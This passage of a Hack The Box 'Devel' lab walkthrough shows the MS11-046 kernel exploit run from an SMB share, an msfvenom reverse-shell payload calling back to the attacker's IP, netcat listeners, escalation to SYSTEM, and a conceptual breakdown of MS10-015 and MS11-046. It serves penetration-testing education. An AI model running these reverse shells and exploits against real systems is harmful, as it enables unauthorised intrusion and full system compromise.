We use abatchy17's [WindowsExploits](https://github.com/abatchy17/WindowsExploits) repository, which contains a precompiled version of the MS11-046 exploit. This allows us to quickly obtain a working binary and focus on the exploitation process rather than compiling the source code ourselves.

After downloading the exploit, we host it from an SMB share on our attacking machine, allowing the target to access and execute the binary remotely.

```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ ls
met.aspx  MS11-046.exe  shell.aspx

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ impacket-smbserver kali .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49161

PS C:\windows\system32\inetsrv> \\10.10.14.39\kali\MS11-046.exe

c:\Windows\System32>[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82818000
      [*] Offset:       0x008b0000
      [+] HalDispatchTable
         [*] Offset:    0x009d93b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x76fe5510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x76fe4ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell
PS C:\windows\system32\inetsrv> 
```

The exploit completes successfully; however, instead of receiving a new elevated session, we are returned to our existing shell. This highlights an important limitation with our current PowerShell access: while we can execute commands, the shell does not behave like a fully interactive session.

> **Lessons Learned — Why the Exploit Exited Immediately**
>
> The MS11-046 exploit achieves privilege escalation by stealing the SYSTEM token and then spawning a new `cmd.exe` process running in that elevated context. When called from a PowerShell session that itself was spawned by a webshell, there is no allocated console or PTY (pseudo-terminal) for the new elevated process to attach to. The SYSTEM-level `cmd.exe` spawns, finds no interactive terminal to bind to, and exits immediately — dropping back to the original low-privileged session as if nothing happened.
>
> This is a symptom of the shell chain: **webshell → PowerShell → exploit**. Each link in that chain is non-interactive. The PowerShell session we labelled as "interactive" earlier is technically a dumb shell — it can run commands but cannot host child processes that require a console context to persist in. The solution is a properly interactive reverse shell (the `shell.exe` generated by msfvenom below) which allocates a real console that the spawned SYSTEM process can attach to and remain open in.

To resolve this issue, we generate a new reverse shell using `msfvenom`. This provides us with a more reliable method of interacting with the target and should prevent compatibility issues when executing binaries or additional tooling during the privilege escalation process.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4443 -f exe -o shell.exe
```

From our existing PowerShell session, spawned through the webshell, we remotely execute the newly generated `shell.exe` payload from our SMB share. The payload successfully connects back to our newly created listener, providing us with a more reliable and interactive shell session for further enumeration and exploitation.
```PowerShell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49197

PS C:\windows\system32\inetsrv> \\10.10.14.39\kali\shell.exe


┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel]
└─$ nc -lvnp 4443                                                                                 
listening on [any] 4443 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49199
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\system32\inetsrv>
```

From our upgraded shell session, we can now remotely execute MS11-046.exe from our SMB share. This time the exploit completes successfully, providing us with a new session running as "NT AUTHORITY\SYSTEM" and confirming that we have successfully escalated our privileges to the highest security context on the machine.
```Shell
C:\windows\system32\inetsrv>\\10.10.14.39\kali\MS11-046.exe
\\10.10.14.39\kali\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>hostname
hostname
devel
```

With successful privilege escalation achieved, we now have the required level of access to locate and retrieve the user and root flags from the machine. In the next section, we will complete the box by locating these files and confirming full compromise of the target.

---
### Obtaining the Flags

With our privileges successfully escalated, we now have sufficient access to retrieve both the `user.txt` and `root.txt` flags from the machine. We can use the `dir` command from our previous walkthrough to locate the files, then use the `type` command to display their contents and complete the box.

```Shell
c:\Windows\System32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
dir C:\ /s /b /a:-d 2>nul | find "root.txt"
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt (2).lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt.lnk
C:\Users\Administrator\Desktop\root.txt

c:\Windows\System32>dir C:\ /s /b /a:-d 2>nul | find "user.txt"
dir C:\ /s /b /a:-d 2>nul | find "user.txt"
C:\Users\babis\AppData\Roaming\Microsoft\Windows\Recent\user.txt.lnk
C:\Users\babis\Desktop\user.txt


c:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
[root flag redacted]

c:\Windows\System32>type C:\Users\babis\Desktop\user.txt
type C:\Users\babis\Desktop\user.txt
[user flag redacted]
```

---

### Dissecting the Exploit

Ending the walkthrough here would leave the most interesting part unexplored. Up to this point, we have successfully executed two privilege escalation exploits, but we have not yet examined the underlying mechanics behind how or why they work. In this section, we will dissect both exploits, exploring their technical foundations and comparing their behaviour from an operational perspective.

**MS10-015 (KiTrap0D) — CVE-2010-0233**

MS10-015 is the first local privilege escalation vulnerability we used — a Windows kernel exploit. It stems from improper handling of General Protection Fault (#GP) exceptions in the Windows kernel's Virtual DOS Machine (VDM) subsystem. The name **KiTrap0D** comes from the kernel's internal naming convention: `Ki` (Kernel Interrupt) + `Trap` + `0D` (hex 13, the exception vector for a #GP fault). Under specific circumstances, an attacker can trigger this exception handler in a way that corrupts kernel memory.

Because the Windows kernel executes with the highest privilege level (Ring 0), successfully exploiting this corruption allows an attacker to execute arbitrary code in kernel mode and elevate their process to NT AUTHORITY\SYSTEM.

At a high level, the exploit performs the following steps:

1. A low-privileged process opens a VDM (Virtual DOS Machine) context and triggers a General Protection Fault (#GP) exception.
2. The exception is dispatched to the Windows kernel function `KiTrap0D`.
3. Due to a flaw in the exception handling logic, the attacker can influence kernel memory during exception processing.
4. The exploit executes code in kernel mode.
5. The exploit replaces the current process's security token with the SYSTEM process token.
6. When execution returns to user mode, the process now possesses SYSTEM privileges.

**Why does the exploit copy the SYSTEM token?**

- Every Windows process has an access token that defines the identity and privileges under which it runs.
- Rather than creating new privileges, the exploit simply copies the access token belonging to the SYSTEM process (PID 4) and assigns it to the attacker's process.
- Windows now believes the process *is* SYSTEM.
- This technique is common among Windows local privilege escalation exploits.


**MS11-046 (AFD.sys) — CVE-2011-1249**

MS11-046 affects `AFD.sys`, the Ancillary Function Driver, which forms part of the Windows networking subsystem and provides the kernel interface used by Winsock. A flaw in the driver's handling of certain I/O requests allows a local attacker to overwrite kernel memory. Because `AFD.sys` runs in kernel mode, this memory corruption can be leveraged to execute arbitrary code with kernel privileges.

The exploit generally follows these stages:

1. Open a handle to the vulnerable AFD.sys driver.
2. Craft a specially formed I/O request.
3. Trigger the vulnerable code path within the driver.
4. Overwrite a function pointer in kernel memory.
5. Redirect execution to attacker-controlled shellcode.
6. Execute code in Ring 0.
7. Replace the current process token with the SYSTEM token.
8. Return to user mode as NT AUTHORITY\SYSTEM.


**Common Pattern Between Both**

Although these exploits target completely different vulnerabilities, they both ultimately achieve the same goal:

| MS10-015                          | MS11-046                     |
| --------------------------------- | ---------------------------- |
| Vulnerable kernel exception handler | Vulnerable network driver  |
| Kernel memory corruption          | Kernel memory corruption     |
| Execute attacker code in Ring 0   | Execute attacker code in Ring 0 |
| Steal SYSTEM token                | Steal SYSTEM token           |
| Return to user mode as SYSTEM     | Return to user mode as SYSTEM |

This illustrates an important concept in Windows privilege escalation: the vulnerability itself is often just the entry point. Once kernel code execution is obtained, many exploits use the same technique of replacing the current process's access token with that of the SYSTEM process, instantly granting the highest level of privilege.

**Conclusion**

While these exploits appear very different on the surface, they share a common objective: achieving code execution within the Windows kernel. Once running in kernel mode, the exploit can manipulate operating system data structures that are normally protected from user applications. In both cases this culminates in replacing the current process's access token with the SYSTEM token, demonstrating that many Windows privilege escalation exploits rely on the same post-exploitation technique despite exploiting entirely different vulnerabilities.

![Side-by-side comparison diagram of MS10-015 and MS11-046 exploitation chains]({{ '/assets/img/htb-devel/Devel_DTE_Compare.png' | relative_url }})
